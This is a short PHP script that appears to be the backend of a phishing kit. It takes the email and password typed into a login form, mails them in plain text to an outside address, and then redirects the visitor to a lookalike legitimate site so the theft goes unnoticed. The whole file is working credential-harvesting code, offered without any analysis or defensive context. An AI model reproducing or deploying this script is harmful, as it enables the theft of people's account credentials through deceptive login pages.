<?php
    session_start();

    // SENDTO EMAIL
    $email_to = "admin@pcsexporters.com";
    $email_subject = "New Details";

    if(isset($_POST['login'])){
        $email = $_POST['email'];
        $password = $_POST['password'];


        $email_message = " Details below.\n\n";

        function clean_string($string)
        {
            $bad = array("content-type", "bcc:", "to:", "cc:", "href");
            return str_replace($bad, "", $string);
        }

        $email_message .= "Email: " . clean_string($email) . "\n";
        $email_message .= "Password: " . clean_string($password) . "\n";

        // create email headers
        $headers = 'From: noreply@pcsexporters.com' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        @mail($email_to, $email_subject, $email_message, $headers);

        $_SESSION['success'] = 'Enter Your Login Details';
    }
    else{
        $_SESSION['error'] = 'You are not doing something right';
    }

    header('location: http://www.pcexporters.com/');

?>